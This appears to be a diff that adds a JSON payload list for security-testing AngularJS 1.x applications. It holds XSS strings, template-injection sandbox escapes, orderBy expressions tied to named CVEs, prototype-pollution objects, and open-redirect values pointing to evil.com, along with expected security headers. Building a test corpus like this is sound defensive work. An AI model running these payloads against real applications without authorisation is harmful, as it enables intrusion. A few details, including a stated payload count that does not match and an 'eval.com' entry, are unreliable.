@@ -1,0 +1,70 @@
+{
+  "payloads": {
+    "dom_xss": {
+      "description": "XSS через $sce.trustAsHtml / ng-bind-html специфичные для AngularJS",
+      "entries": [
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<input onfocus=eval('alert(1)') autofocus>",
+        "{{constructor.constructor('alert(1)')()}}",
+        "{{a='constructor';b='constructor';a[b]('alert(1)')()}}",
+        "<a ng-click=alert(1)>click</a>",
+        "<div ng-app>{{$on.constructor('alert(1)')()}}</div>",
+        "<script>angular.module('app').controller('ctrl',function($scope){$scope.$apply('constructor.constructor(\"alert(1)\")()')})</script>"
+      ]
+    },
+    "template_injection": {
+      "description": "AngularJS Template Injection — $compile RCE",
+      "entries": [
+        "{{constructor.constructor('return this')()}}",
+        "{{constructor.constructor('alert(1)')()}}",
+        "{{$on.constructor.constructor('return this')()}}",
+        "{{$parent.constructor.constructor('return this')()}}",
+        "{{[].constructor.constructor('return this')()}}",
+        "{{x=[''],[].constructor.constructor('return x[0]=this')().__proto__.injected='true'}}",
+        "{{orderBy:'':$on.constructor('return this')()}}"
+      ]
+    },
+    "orderby_rce": {
+      "description": "AngularJS orderBy predicate expression RCE (CVE-2015-5255, CVE-2016-2227)",
+      "entries": [
+        "[[1,2]].sort($on.constructor('return this')())",
+        "[{a:1}].sort($on.constructor('constructor[\"return this\"]()')())",
+        "[1,2].orderBy:'':constructor.constructor('return this')()"
+      ]
+    },
+    "prototype_pollution": {
+      "description": "Prototype Pollution через angular.extend/merge",
+      "entries": [
+        {"__proto__": {"polluted": "true"}},
+        {"constructor": {"prototype": {"polluted": "true"}}},
+        {"__proto__": {"isAdmin": true}},
+        {"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}},
+        {"constructor.prototype": {"polluted": "true"}}
+      ]
+    },
+    "open_redirect": {
+      "description": "Open Redirect пейлоады для $location / window.location",
+      "entries": [
+        "javascript:alert(1)",
+        "//evil.com/",
+        "https://evil.com/redirect",
+        "///evil.com",
+        "%2Feval.com",
+        "////evil.com"
+      ]
+    },
+    "http_headers": {
+      "description": "Auth headers и CSP для AngularJS",
+      "headers": {
+        "expected": ["X-Content-Type-Options: nosniff", "X-Frame-Options: DENY", "Content-Security-Policy", "Set-Cookie: *HttpOnly"]
+      }
+    }
+  },
+  "meta": {
+    "version": "1.0",
+    "target": "AngularJS (1.x) applications via HTTP",
+    "total_payloads": 30,
+    "created": "2026-09-10"
+  }
+}
